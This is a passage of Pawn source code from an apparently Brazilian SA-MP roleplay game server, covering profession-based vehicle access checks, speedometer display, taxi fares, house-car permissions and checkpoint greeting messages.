			}
	    }
    	if(pInfo[playerid][Gas] <= 0 && GetVehicleModel(veiculo) != 481 && GetVehicleModel(veiculo) != 509 && GetVehicleModel(veiculo) != 510)
		{
			SendClientMessage(playerid, COR_ERRO, "Você está sem combustível procure pelo posto mais próximo e abasteça!");
            RemovePlayerFromVehicle(playerid);
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			return 1;
		}
		if(pInfo[playerid][Tem_Velocimetro] == 1 && pInfo[playerid][VelocimetroO_F] == 1)
		{
		    TextDrawShowForPlayer(playerid, Velocimetro0[playerid]);
		}
		else
		{
   			TextDrawHideForPlayer(playerid, Velocimetro0[playerid]);
		}
		TextDrawShowForPlayer(playerid, Velocimetro1[playerid]);
		TextDrawShowForPlayer(playerid, Velocimetro2[playerid]);
		TextDrawShowForPlayer(playerid, Velocimetro3[playerid]);
		TextDrawShowForPlayer(playerid, Velocimetro4[playerid]);
		TextDrawShowForPlayer(playerid, Velocimetro5[playerid]);
		TextDrawShowForPlayer(playerid, Velocimetro6[playerid]);
		TextDrawShowForPlayer(playerid, Velocimetro7[playerid]);
		TextDrawShowForPlayer(playerid, Velocimetro8[playerid]);

	    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));

		if(GetVehicleModel(veiculo) == 525)
	 	{
	        Eguicho[playerid] = 1;
	        CaminhaoGuincho ++;
		}
        if(ParticipandoEvento[playerid] == 1)
        {
          	KillTimer(Volta[playerid]);
         	Tempo_Volta[playerid] = 50;
        }
        if(veiculo == vPrefeito[0] || veiculo == vPrefeito[1] || veiculo == vPrefeito[2])
        {
            if(fexist("Eleitos.ini"))
            {
            	if(!strcmp(WE_GetString("Eleitos.ini", "Presidente"), PlayerName(playerid), true))
				{
				    format(gStr, sizeof(gStr), "Olá Sr.(a) %s, seja bem-vindo em seu veículo presidencial.", PlayerName(playerid));
				    SendClientMessage(playerid, COR_AMARELO, gStr);
				}
				else
				{
					RemovePlayerFromVehicle(playerid);
					format(gStr, sizeof(gStr), "Este veículo é reservado para o(a) presidente!");
				    SendClientMessage(playerid, COR_AMARELO, gStr);
					PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				}
			}
			else
			{
				WE_CreateFile("Eleitos.ini");
			    WE_SetInt("Eleitos.ini", "votoStatus", 0);
			    WE_SetString("Eleitos.ini", "Presidente", "Nenhum");
			    WE_SetInt("Eleitos.ini", "Candidatos", 0);
			    WE_SetString("Eleitos.ini", "1_", "Nenhum");
			    WE_SetString("Eleitos.ini", "2_", "Nenhum");
			    WE_SetString("Eleitos.ini", "3_", "Nenhum");
			    WE_SetString("Eleitos.ini", "4_", "Nenhum");
			    WE_SetString("Eleitos.ini", "5_", "Nenhum");
			    WE_SetString("Eleitos.ini", "6_", "Nenhum");
			    WE_SetString("Eleitos.ini", "7_", "Nenhum");
			    WE_SetString("Eleitos.ini", "8_", "Nenhum");
			    WE_SetString("Eleitos.ini", "9_", "Nenhum");
			    WE_SetString("Eleitos.ini", "10_", "Nenhum");
			    WE_SetInt("Eleitos.ini", "1", 0);
			    WE_SetInt("Eleitos.ini", "2", 0);
			    WE_SetInt("Eleitos.ini", "3", 0);
			    WE_SetInt("Eleitos.ini", "4", 0);
			    WE_SetInt("Eleitos.ini", "5", 0);
			    WE_SetInt("Eleitos.ini", "6", 0);
			    WE_SetInt("Eleitos.ini", "7", 0);
			    WE_SetInt("Eleitos.ini", "8", 0);
			    WE_SetInt("Eleitos.ini", "9", 0);
			    WE_SetInt("Eleitos.ini", "10", 0);
			    RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_ERRO, "Este veículo é reservado para o(a) presidente!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
			}
            return 1;
        }
		if(GetVehicleModel(veiculo) == 431)
	    {
			if(pInfo[playerid][Prof] != MOTORISTA_ONIBUS && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_MOTORISTABUS, "Este veículo é reservado para os(as) Motoristas de Ônibus!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
    			return 1;
			}
		}
		if(GetVehicleModel(veiculo) == 420 || GetVehicleModel(veiculo) == 438)
	    {
	        if(pInfo[playerid][Prof] != TAXISTA && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_TAXISTA, "Este veículo é reservado para os(as) Taxistas!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
		if(GetVehicleModel(veiculo) == 597 || GetVehicleModel(veiculo) == 523 || GetVehicleModel(veiculo) == 497 || GetVehicleModel(veiculo) == 598 || GetVehicleModel(veiculo) == 490 || GetVehicleModel(veiculo) == 528 || GetVehicleModel(veiculo) == 596)
	    {
	        if(pInfo[playerid][Prof] != GUARDA_TRANSITO && pInfo[playerid][Prof] != POL_CIVIL && pInfo[playerid][Prof] != POL_MILITAR && pInfo[playerid][Prof] != POL_RODOVIARIO && pInfo[playerid][Prof] != POL_FEDERAL && pInfo[playerid][Prof] != JUIZ && pInfo[playerid][Prof] != EXERCITO && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, 0x8CB972FF, "Este veículo é reservado para oficiais da lei!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
			}
			else
			{
			    if(pInfo[playerid][fardado] == 0)
			    {
			    	RemovePlayerFromVehicle(playerid);
					SendClientMessage(playerid, COR_ERRO, "Você não pode dirigir uma viatura sem estar fardado(a)!");
					PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
			    }
			}
		}
		if(GetVehicleModel(veiculo) == 599)
		{
            if(pInfo[playerid][Prof] != GUARDA_TRANSITO && pInfo[playerid][Prof] != POL_CIVIL && pInfo[playerid][Prof] != POL_MILITAR && pInfo[playerid][Prof] != POL_RODOVIARIO && pInfo[playerid][Prof] != POL_FEDERAL && pInfo[playerid][Prof] != JUIZ && pInfo[playerid][Prof] != EXERCITO && pInfo[playerid][Prof] != BOMBEIRO && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, AZUL_WE, "{FF1E1E}{1E90FF}Este veículo é reservado para oficiais da lei!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
			}
			else
			{
			    if(pInfo[playerid][Prof] != BOMBEIRO && pInfo[playerid][fardado] == 0)
			    {
			    	RemovePlayerFromVehicle(playerid);
					SendClientMessage(playerid, COR_ERRO, "Você não pode dirigir uma viatura sem estar fardado(a)!");
					PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
			    }
			}
		}
	    if(veiculo == vNovatos[0] || veiculo == vNovatos[1] || veiculo == vNovatos[2] || veiculo == vNovatos[3] || veiculo == vNovatos[4] || veiculo == vNovatos[5] || veiculo == vNovatos[6] || veiculo == vNovatos[7] || veiculo == vNovatos[8] || veiculo == vNovatos[9])
	    {
	        if(pInfo[playerid][Level] > 5)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_ERRO, "Esse veículo é reservado para novatos(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você poderá usar estas bicicletas até completar 5 níveis!");
				return 1;
			}
		}
	    if(veiculo == vPrivados[0] || veiculo == vPrivados[1] || veiculo == vPrivados[2] || veiculo == vPrivados[3] || veiculo == vPrivados[4] || veiculo == vPrivados[5])
	    {
	        if(aInfo[playerid][AdminL] == 0)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_ERRO, "Esse veículo é reservado para amostra da Grotti Veículos!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, AZUL_WE, "Seja bem-vindo(a) a um veículo Grotti exclusivo, não abuse de seu uso!");
				return 1;
			}
		}
        if(GetVehicleModel(veiculo) == 553)
	    {
	        if(pInfo[playerid][Level] < 1000 && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_ERRO, "Não é permitido o uso de bombardeiros antes de completar 1000 níveis!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
	    if(veiculo == vTRANSPORTADOR[0] ||
		veiculo == vTRANSPORTADOR[1] ||
		veiculo == vTRANSPORTADOR[2] ||
		veiculo == vTRANSPORTADOR[3] ||
		veiculo == vTRANSPORTADOR[4] ||
		veiculo == vTRANSPORTADOR[5] ||
		veiculo == vTRANSPORTADOR[6] ||
		veiculo == vTRANSPORTADOR[7] ||
		veiculo == vTRANSPORTADOR[8] ||
		veiculo == vTRANSPORTADOR[9] ||
		veiculo == vTRANSPORTADOR[10] ||
		veiculo == vTRANSPORTADOR[11] ||
		veiculo == vTRANSPORTADOR[12] ||
		veiculo == vTRANSPORTADOR[13] ||
		veiculo == vTRANSPORTADOR[14])
	    {
	        if(pInfo[playerid][Prof] != TRANSPORTADOR && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_TRANSPORTADOR, "Este veículo é reservado para os(as) Transportadores!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
		if(GetVehicleModel(veiculo) == 403 || GetVehicleModel(veiculo) == 514 || GetVehicleModel(veiculo) == 515)
	    {
			if(Carga[playerid] == 1 && saiuCaminhao[playerid] == 1)
			{
			    saiuCaminhao[playerid] = 0;
			    KillTimer(cargaTempo[playerid]);
			}
	        if(pInfo[playerid][Prof] != CAMINHONEIRO && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_CAMINHONEIRO, "Este veículo é reservado para os(as) Caminhoneiros(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vPescadores[0] || veiculo == vPescadores[1] || veiculo == vPescadores[2] || veiculo == vPescadores[3])
	    {
	        if(pInfo[playerid][Prof] != PESCADOR && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_PESCADOR, "Este veículo é reservado para os(as) Pescadores(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
	    if(veiculo == vSegurancas[0] || veiculo == vSegurancas[1] || veiculo == vSegurancas[2])
	    {
	        if(pInfo[playerid][Prof] != SEGURANCA_PART && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_SEGPART, "Este veículo é reservado para os(as) Seguranças Particulares!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vMotoristap[0] || veiculo == vMotoristap[1])
	    {
	        if(pInfo[playerid][Prof] != MOTORISTA_PART && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_MOTPART, "Este veículo é reservado para os(as) Motoristas Particulares!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vMotoTaxista[0] || veiculo == vMotoTaxista[1] || veiculo == vMotoTaxista[2])
	    {
	        if(pInfo[playerid][Prof] != MOTO_TAXISTA && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_MOTOTAXI, "Este veículo é reservado para os(as) Moto Taxista!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vPilotoPart[0] || veiculo == vPilotoPart[1] || veiculo == vPilotoPart[2] || veiculo == vPilotoPart[3] || veiculo == vPilotoPart[4] || veiculo == vPilotoPart[5])
	    {
	        if(pInfo[playerid][Prof] != PILOTO_PART && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_PILOTOPAR, "Este veículo é reservado para os(as) Pilotos Particulares!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vTraficDrogas[0] || veiculo == vTraficDrogas[1] || veiculo == vTraficDrogas[2] || veiculo == vTraficDrogas[3] || veiculo == vTraficDrogas[4] || veiculo == vTraficDrogas[5])
	    {
	        if(pInfo[playerid][Prof] != TRAF_DROGAS && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_TRAFDROGAS, "Este veículo é reservado para os(as) Traficantes de Drogas!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vTraficArmas[0] || veiculo == vTraficArmas[1] || veiculo == vTraficArmas[2] || veiculo == vTraficArmas[3])
	    {
	        if(pInfo[playerid][Prof] != TRAF_ARMAS && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_TRAFARMAS, "Este veículo é reservado para os(as) Traficantes de Armas!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vHitman[0] ||  veiculo == vHitman[1] ||  veiculo == vHitman[2])
	    {
	        if(pInfo[playerid][Prof] != HITMAN && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_HITMAN, "Este veículo é reservado para os(as) Hitman!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vTerrorista[0] || veiculo == vTerrorista[1] || veiculo == vTerrorista[2] || veiculo == vTerrorista[3])
	    {
	        if(pInfo[playerid][Prof] != TERRORISTA && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_TERRORISTA, "Este veículo é reservado para os(as) Terroristas!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vChefeMafia[0] || veiculo == vChefeMafia[1] || veiculo == vChefeMafia[2] || veiculo == vChefeMafia[3] || veiculo == vChefeMafia[4])
	    {
	        if(pInfo[playerid][Prof] != CHEFE_MAFIA && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_CHEFEMAFIA, "Este veículo é reservado para os(as) Chefes da Máfia!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vFotografo[0] || veiculo == vFotografo[1])
	    {
	        if(pInfo[playerid][Prof] != FOTOGRAFO && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_FOTOGRAFO, "Este veículo é reservado para os(as) Fotógrafos(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vReporter[0] || veiculo == vReporter[1] || veiculo == vReporter[2] || veiculo == vReporter[3])
	    {
	        if(pInfo[playerid][Prof] != REPORTER && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_REPORTER, "Este veículo é reservado para os(as) Repórters!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vInstrutor[0] || veiculo == vInstrutor[1])
	    {
	        if(pInfo[playerid][Prof] != INSTRUTOR && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_INSTRUTOR, "Este veículo é reservado para os(as) Instrutores(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vMecanico[0] || veiculo == vMecanico[1] || veiculo == vMecanico[2])
	    {
	        if(pInfo[playerid][Prof] != MECANICO && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_MECANICO, "Este veículo é reservado para os(as) Mecânicos(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vMedico[0] || veiculo == vMedico[1])
	    {
	        if(pInfo[playerid][Prof] != MEDICO && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_MEDICO, "Este veículo é reservado para os(as) Médicos(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vAmbulancias[0] ||
		  	veiculo == vAmbulancias[1] ||
	 		veiculo == vAmbulancias[2] ||
	 		veiculo == vAmbulancias[3] ||
			veiculo == vAmbulancias[4] ||
			veiculo == vAmbulancias[5] ||
  			veiculo == vAmbulancias[6] ||
		  	veiculo == vAmbulancias[7] ||
		  	veiculo == vAmbulancias[8] ||
		  	veiculo == vAmbulancias[9])
	    {
     		if(pInfo[playerid][Prof] != MEDICO && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_MEDICO, "Este veículo é reservado para os(as) Médicos(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vPadre[0])
	    {
	        if(pInfo[playerid][Prof] != PADRE && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_PADRE, "Este veículo é reservado para os Padres!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vPizzaBoy[0] || veiculo == vPizzaBoy[1] || veiculo == vPizzaBoy[2] || veiculo == vPizzaBoy[3] || veiculo == vPizzaBoy[4])
	    {
	        if(pInfo[playerid][Prof] != PIZZABOY && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_PIZZABOY, "Este veículo é reservado para os(as) Pizza Boy/Girl!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vAdvogado[0] || veiculo == vAdvogado[1])
	    {
	        if(pInfo[playerid][Prof] != ADVOGADO && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_ADVOGADO, "Este veículo é reservado para os(as) Advogados(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
		if(veiculo == vContrabandista[0] || veiculo == vContrabandista[1] || veiculo == vContrabandista[2] || veiculo == vContrabandista[3] || veiculo == vContrabandista[4] || veiculo == vContrabandista[5] || veiculo == vContrabandista[6] || veiculo == vContrabandista[7]
		|| veiculo == vContrabandista[8] || veiculo == vContrabandista[9])
		{
	        if(pInfo[playerid][Prof] != CONTRABANDISTA && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_ADVOGADO, "Este veículo é reservado para os(as) Contrabandistas!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == vBombeiros[0] || veiculo == vBombeiros[1] || veiculo == vBombeiros[2] || veiculo == vBombeiros[3] || veiculo == vBombeiros[4] || veiculo == vBombeiros[5] || veiculo == vBombeiros[6] || veiculo == vBombeiros[7])
	    {
	        if(pInfo[playerid][Prof] != BOMBEIRO && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_BOMBEIRO, "Este veículo é reservado para os(as) Bombeiros(as)!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
  		if(veiculo == 538)
	    {
	        if(pInfo[playerid][Prof] != MAQUINISTA && aInfo[playerid][Admin] != 1)
			{
				RemovePlayerFromVehicle(playerid);
				SendClientMessage(playerid, COR_MAQUINISTA, "Este veículo é reservado para os(as) Maquinistas!");
				PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
				return 1;
			}
		}
		for(new c; c < sizeof(cInfo); c++)
		{
   			if(veiculo == cInfo[c][HouseCar])
			{
			    format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
        		if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true) == 0)
				{
					format(gStr, sizeof(gStr), "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Seja bem-vindo(a) ao seu veículo %s.", CasaInfo[c][Proprietario]);
					SendClientMessage(playerid, 0xFFFFCCAA, gStr);
				    return 1;
				}
				else if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
				{
					if(strcmp(CasaInfo[c][Morador], PlayerName(playerid), true) == 0)
				    {
						if(WE_GetInt(hFile, "vM1") == 1)
						{
   							format(gStr, sizeof(gStr), "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Seja bem-vindo(a) ao veículo de %s.", CasaInfo[c][Proprietario]);
							SendClientMessage(playerid, 0xCCCCFFAA, gStr);
							return 1;
						}
     					else if(WE_GetInt(hFile, "vM1") == 0)
						{
						    SendClientFormat(playerid, 0xFFFFFFAA, "%s não liberou você para dirigir o veículo da casa, portanto você não pode dirigi-lo!", CasaInfo[c][Proprietario]);
                            if(aInfo[playerid][Admin] == 0)
                            {
								RemovePlayerFromVehicle(playerid);
							}
						    return 1;
						}
					}
					if(strcmp(CasaInfo[c][Morador2], PlayerName(playerid), true) == 0)
					{
   						if(WE_GetInt(hFile, "vM2") == 1)
						{
   							format(gStr, sizeof(gStr), "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Seja bem-vindo(a) ao veículo de %s.", CasaInfo[c][Proprietario]);
							SendClientMessage(playerid, 0xCCCCFFAA, gStr);
							return 1;
						}
     					else if(WE_GetInt(hFile, "vM2") == 0)
						{
						    SendClientFormat(playerid, 0xFFFFFFAA, "%s não liberou você para dirigir o veículo da casa, portanto você não pode dirigi-lo!", CasaInfo[c][Proprietario]);
                            if(aInfo[playerid][Admin] == 0)
                            {
								RemovePlayerFromVehicle(playerid);
							}
						    return 1;
						}
					}
   					if(strcmp(CasaInfo[c][Morador3], PlayerName(playerid), true) == 0)
					{
   						if(WE_GetInt(hFile, "vM3") == 1)
						{
   							format(gStr, sizeof(gStr), "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Seja bem-vindo(a) ao veículo de %s.", CasaInfo[c][Proprietario]);
							SendClientMessage(playerid, 0xCCCCFFAA, gStr);
							return 1;
						}
						else if(WE_GetInt(hFile, "vM3") == 0)
						{
						    SendClientFormat(playerid, 0xFFFFFFAA, "%s não liberou você para dirigir o veículo da casa, portanto você não pode dirigi-lo!", CasaInfo[c][Proprietario]);
						    if(aInfo[playerid][Admin] == 0)
						    {
						    	RemovePlayerFromVehicle(playerid);
							}
						    return 1;
						}
					}
					if(CasaInfo[c][vLiberado] == 0)
					{
						format(gStr, sizeof(gStr), "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Este veículo pertence à %s e não está liberado portando você não pode dirigi-lo!", CasaInfo[c][Proprietario]);
						SendClientMessage(playerid, 0x33CC99AA, gStr);
						PlayerPlaySound(playerid, 1147, 0.0, 0.0, 0.0);
						if(aInfo[playerid][Admin] == 0)
						{
							RemovePlayerFromVehicle(playerid);
						}
						return 1;
			    	}
			    	else if(CasaInfo[c][vLiberado] == 1)
			    	{
	      				format(gStr, sizeof(gStr), "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Este veículo pertence à %s está liberado para qualquer um dirigi-lo!", CasaInfo[c][Proprietario]);
						SendClientMessage(playerid, 0xCCCCFFAA, gStr);
						return 1;
					}
				}
			}
		}
		return 1;
	}
	else if(oldstate == PLAYER_STATE_DRIVER)
	{
		TextDrawHideForPlayer(playerid, Velocimetro0[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro1[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro2[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro3[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro4[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro5[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro6[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro7[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro8[playerid]);

	}
	if(newstate == PLAYER_STATE_ONFOOT)
	{
		RemovePlayerAttachedObject(playerid, 5);

		TextDrawHideForPlayer(playerid, Velocimetro0[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro1[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro2[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro3[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro4[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro5[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro6[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro7[playerid]);
		TextDrawHideForPlayer(playerid, Velocimetro8[playerid]);

        if(ParticipandoEvento[playerid] == 1 && Finalizou[playerid] == 0)
        {
            Tempo_Volta[playerid] = 30;
            Volta[playerid] = SetTimerEx("TempoVolta", 1000, false, "d", playerid);
            return 1;
        }
		if(Carga[playerid] == 1)
		{
		    SendClientMessage(playerid, COR_AMARELO, "Você saiu do caminhão carregado, você tem 50 segundos para voltar!");
            saiuCaminhao[playerid] = 1;
			cargaTempo[playerid] = 50;
		    tempoCarga[playerid] = SetTimerEx("voltarCaminhao", 1000, false, "d", playerid);
		    return 1;
		}
    	if(Taximetro[playerid][1] == 1)
		{
		    KillTimer(T_Taximetro[playerid]);
		    SendClientMessage(playerid, COR_AMARELO, "O taxista foi pago pela sua corrida!");
		    format(gStr, sizeof(gStr), "Você recebe R$%d pela corrida feita para %s", PrecoTaximetro[playerid], PlayerName(playerid));
			SendClientMessage(Taximetro[playerid][2], COR_AMARELO, gStr);
		    sGivePlayerCash(playerid, -PrecoTaximetro[playerid]);
		    sGivePlayerCash(Taximetro[playerid][2], PrecoTaximetro[playerid]);
		    Taxista_P[Taximetro[playerid][2]] = 0;
			Taximetro[playerid][1] = 0;
			Taximetro[playerid][2] = -1;
			PrecoTaximetro[playerid] = 0;
		}
		if(Eguicho[playerid] == 1)
		{
		    Eguicho[playerid] = 0;
		    CaminhaoGuincho --;
		}
	}
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
//------------------------------ DriveThru -------------------------------------
	if(IsPlayerInDynamicCP(playerid, CP_DV1) ||
	IsPlayerInDynamicCP(playerid, CP_DV2) ||
	IsPlayerInDynamicCP(playerid, CP_DV3) ||
	IsPlayerInDynamicCP(playerid, CP_DV4) ||
	IsPlayerInDynamicCP(playerid, CP_DV5) ||
	IsPlayerInDynamicCP(playerid, CP_DV6))
 	{
 		if(!IsPlayerInAnyVehicle(playerid))
		{
			return 1;
		}
	    SendClientMessage(playerid, 0xFF0000FF, " Drive-Thru ");
	    SendClientMessage(playerid, 0x1E90FFFF, "Bem-vindo(a) ao Drive-Thru, use: /DriveThru");
	    SendClientMessage(playerid, 0xFF0000FF, " Drive-Thru ");
	    return 1;
	}
//------------------------------ DriveThru -------------------------------------
//-------------------------------- FomeSedeSono --------------------------------
	new nomecheck = CPS_GetPlayerCheckpoint(playerid);

	if(nomecheck == BS10 || nomecheck == RBD17 || nomecheck == CB9 || nomecheck == WSP5 || nomecheck == JD4)
	{
		SendClientMessage(playerid, 0xFF8800AA, " Lanchonete ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Bem-vindo(a) a lanchonete! Use: {FF8800}/Cardapio");
		SendClientMessage(playerid, 0xFF8800AA, " Lanchonete ");
		return 1;
	}

	if(nomecheck == ZEU)
	{
		SendClientMessage(playerid, AZUL_WE, " Hotel ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Bem-vindo(a) ao Hotel! Use: {1E90FF}/AlugarQ");
		SendClientMessage(playerid, AZUL_WE, " Hotel ");
		return 1;
	}
//---------------------------------- FSS ---------------------------------------

    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);

	if(IsPlayerInDynamicCP(playerid, CP_0))
 	{
	    SendClientMessage(playerid, AZUL_WE, " Agência de Empregos ");
	    SendClientMessage(playerid, 0xFFFFFFAA, " Para selecionar sua profissão, use: '/Empregos' ou '/Profs'");
	    SendClientMessage(playerid, AZUL_WE, " Agência de Empregos ");
	    return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_6)) // Ginásio de Lutas
	{
	    SendClientMessage(playerid, AZUL_WE, " Ginásio de Luta ");
	    SendClientMessage(playerid, 0xFFFFFFAA, " Para abrir o menu de lusta digite: '/Lutas'");
	    SendClientMessage(playerid, AZUL_WE, " Ginásio de Luta ");
	    return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_7)) // Cooperativa de Pesca
	{
	    SendClientMessage(playerid, AZUL_WE, "Cooperativa de Pesca ");
	    SendClientMessage(playerid, 0xFFFFFFAA, " Para descarregar o barco digite: '/VenderPescas'");
	    SendClientMessage(playerid, AZUL_WE, "Cooperativa de Pesca ");
	    return 1;
	}
	if(IsPlayerInDynamicCP(playerid, CP_1)) // Banco Central
	{
		SendClientMessage(playerid, AZUL_WE, " Banco Central ");
		SendClientMessage(playerid, 0xFFFFFFAA, " Caso não tenha uma conta bancária digite: '/AbrirConta'");
